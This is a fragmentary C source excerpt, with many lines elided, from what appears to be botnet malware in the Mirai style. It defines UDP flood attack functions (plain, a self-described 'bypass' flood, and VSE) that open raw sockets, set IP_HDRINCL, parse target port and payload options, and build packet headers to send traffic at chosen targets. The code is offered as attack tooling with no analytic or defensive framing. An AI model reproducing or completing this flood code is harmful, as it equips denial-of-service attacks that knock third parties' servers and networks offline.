...
{
    int i, fd;
    char **pkts = mem_calloc(targs_len, sizeof (char *));
    ...
    {
#ifdef DEBUG
        printf("[attack/udp]: failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    ...
    {
#ifdef DEBUG
        printf("[attack/udp]: failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        pkts[i] = mem_calloc(1510, sizeof (char));
...
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = mem_calloc(targs_len, sizeof (char *));
    int *fds = mem_calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        pkts[i] = mem_calloc(65535, sizeof (char));
        ...
        {
#ifdef DEBUG
        printf("[attack/plain]: failed to create DGRAM socket. Aborting attack\n");
#endif
            return;
        }
...
/* epic udp bypass flood made by me */
void attack_udp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        {
#ifdef DEBUG
        printf("[attack/budp]: failed to create DGRAM socket. Aborting attack\n");
#endif
            return;
        }
...
void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    {
#ifdef DEBUG
        printf("[attack/vse]: failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    ...
    {
#ifdef DEBUG
        printf("[attack/vse]: failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        pkts[i] = mem_calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
